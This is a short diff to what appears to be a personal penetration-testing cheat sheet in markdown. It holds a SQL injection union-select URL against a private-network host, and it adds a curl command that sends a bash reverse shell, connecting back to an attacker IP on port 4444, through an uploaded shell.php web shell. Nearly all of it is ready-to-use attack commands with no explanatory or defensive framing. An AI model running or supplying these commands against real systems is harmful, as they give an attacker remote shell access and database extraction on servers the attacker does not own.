@@ -98,3 +98,9 @@ http://192.168.175.10:9090/search?search=gizmo%27)%20union%20select%20null,conca
 
 https://cheatsheetseries.owasp.org/cheatsheets/XSS_Filter_Evasion_Cheat_Sheet.html
 ```
+### curl url encode
+
+```
+curl -k --data-urlencode "cmd=/bin/bash -i -c 'bash -i >& /dev/tcp/192.168.119.175/4444 0>&1'" --get https://192.168.175.44/uploads/shell.php -v
+
+```
